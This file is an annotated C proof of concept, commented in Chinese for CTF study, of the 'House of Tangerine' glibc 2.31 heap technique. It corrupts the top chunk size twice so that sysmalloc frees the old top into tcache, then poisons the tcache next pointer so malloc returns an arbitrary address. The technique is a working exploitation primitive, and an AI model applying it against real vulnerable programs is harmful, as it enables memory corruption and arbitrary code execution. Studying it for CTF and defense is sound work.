/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_tangerine
 * 文件标注范围：2.31
 * 模拟漏洞：能够覆盖 top chunk 的元数据，不需要像传统 House of Force 那样
 *   先把 top size 改成一个超大值。
 * 核心流程：反复触发 sysmalloc 去处理被我们截短过的 top，让它把旧 top 当成
 *   无法合并的 wilderness 顺手送进 tcache，然后对这个 tcache chunk 的 next
 *   字段做 poisoning，换来一次任意地址分配。
 * 成功判据：最终 malloc 返回 target。2.31 单独列出是因为 sysmalloc 和 top
 *   的排布相比 2.26～2.30 有独立调整，但这里 next 字段依然是明文，不需要
 *   额外的堆地址泄露。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// x86 与 x86-64 在这些目标版本上都使用 0x10 malloc 对齐。
#define MALLOC_ALIGN 0x10L
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// sysmalloc 释放旧 top 前会扣除两个 chunk header，作为 fencepost 开销。
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// 选择物理尺寸 0x40 的 chunk 作为最终 tcache poisoning 链节点。
#define CHUNK_SIZE_1 0x40
#define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)

// 这一页内跨度也可拆成多次较小申请；单次大申请只是让堆布局更直观。
#define CHUNK_SIZE_3 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
#define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)

/**
 * 上游作者在 glibc 2.27 和 2.31 上，针对 x86-64、x86、AArch64 三种架构都
 * 验证过这套堆布局。
 *
 * House of Tangerine 可以看作 House of Orange 的现代化版本：它保留了破坏
 * top 元数据的核心思路，但改成让旧 top 经由 sysmalloc 内部调用的 _int_free
 * 间接送进 tcache，整个过程完全不需要我们自己显式调用 free。
 *
 * sysmalloc 对无法合并的旧 top（也就是 wilderness）会执行 _int_free，
 * 具体源码可以参考：
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * 最终目标是通过 tcache poisoning，让 malloc 返回一个满足 MALLOC_ALIGNMENT
 * 对齐要求的任意指针；glibc 2.32 开始 next 字段要按 safe-linking 编码，
 * 所以从这个版本起还需要先拿到一次堆地址泄露。
 *
 * 这里假设的漏洞模型，可以是同时具备正、负两个方向越界写的能力（比如一次
 * 负向 BOF 配合一次正向 OOB），也可以是编辑前一个 chunk 时单纯往高地址方向
 * 溢出，连续覆盖到后面的 top 元数据。
 *
 * 核心利用链本身只需要 5 次 malloc 和 3 次越界写；这份 PoC 为了稳定探测
 * 当前 top size，额外多用了一次 malloc 作探针。
 *
 * 教学用的 PoC 先申请一个探针块，读出当前 top size，这样就不必依赖进程
 * 启动时那点细微的堆余量；真题如果能从固定的堆布局直接预测出这个值，就可以
 * 去掉探针，把总请求数恢复成 5 次。
 *
 * 特别感谢 pepsipu 设计的 PicoCTF 2024 题目《High Frequency Troubles》；
 * 这道题启发了本手法对“无需 free 也能破坏堆”这类场景的系统化整理。
 */
int main() {
  size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
  char win[0x10] = "WIN\0WIN\0WIN\0\x06\xfe\x1b\xe2";
  // 关闭三个标准流的缓冲，避免 stdio 隐式 malloc 干扰 top 与 tcache 布局。
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // 所有物理 chunk size 必须满足 MALLOC_ALIGNMENT；先用断言排除常量计算错误。
  assert((CHUNK_SIZE_1 & MALLOC_MASK) == CHUNK_SIZE_1);
  assert((CHUNK_SIZE_3 & MALLOC_MASK) == CHUNK_SIZE_3);

  // 任意分配目标必须 0x10 对齐，否则 tcache_get 的 aligned_OK 检查会中止。
  target = ((size_t) win + (MALLOC_ALIGN - 1)) & MALLOC_MASK;

  // 先用一个最小探针块读取当前 top size，使 PoC 不依赖进程初始堆余量；
  // 真题若能从固定布局预测 top size，可省去这次 malloc，把总请求数减一。
  heap_ptr = malloc(PROBE);
  top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];

  // 反算第一阶段申请 size_2，使截短后的旧 top 扣除 fencepost 后恰好为 CHUNK_SIZE_1。

  size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
  size_2 &= PAGE_MASK;
  size_2 &= MALLOC_MASK;

  // 第一次关键申请把用户区末端推进到紧邻 top header 的位置。
  heap_ptr = malloc(size_2);

  // 漏洞模拟：用负向越界、正向 OOB 或前一块溢出定位并覆盖 top->size。
  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  // 保留原 top size 的页内低位，使伪造后的 top 逻辑末端仍满足页对齐检查；常见结果为 0x1000。
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;

  // 按 sysmalloc 源码扣除两个 fencepost header，计算即将交给 _int_free 的旧 top 尺寸。
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_SIZE_1);

  /*
   * 请求大于伪造后可用 top 的 SIZE_3，迫使 malloc 进入 sysmalloc。由于我们
   * 把 old_size 截短，旧 top 的逻辑末端无法与新 brk 区域连续合并，sysmalloc
   * 会在建立 fencepost 后调用 _int_free 释放旧 top。保留 PAGE_MASK 对应的
   * 页内位可通过 old_top 末端对齐检查。源码参考：
   * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
   */

  heap_ptr = malloc(SIZE_3);

  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];

  // 第二轮 top 覆盖同样保留页内低位，使伪 top 末端页对齐；常见截短值仍为 0x1000。
  new_top_size = top_size & PAGE_MASK;
  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;

  // 再次扣除 fencepost 开销，确认即将间接释放的旧 top 仍为 CHUNK_SIZE_1。
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;

  assert(freed_top_size == CHUNK_SIZE_1);

  // 被 sysmalloc 间接释放的旧 top 用户区就是 vuln_tcache；保存其 next 字段地址。
  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];

  // 再次请求 SIZE_3，触发 sysmalloc 间接释放上一个截短 top，全程没有显式 free。
  heap_ptr = malloc(SIZE_3);

  // 漏洞写原语：覆盖已释放 vuln_tcache 的 next，使 tcache 链后继指向任意目标。
  heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target;

  // 第一次同尺寸 malloc 取走真实 vuln_tcache，并把伪造后继安装为 tcache 头。
  heap_ptr = malloc(SIZE_1);

  // 第二次同尺寸 malloc 应返回任意目标，从而得到对目标的读写指针。
  heap_ptr = malloc(SIZE_1);

  // 严格比较返回地址与 target；相等才证明无 free 的 top->tcache 任意分配链成功。
  assert((size_t) heap_ptr == target);

}
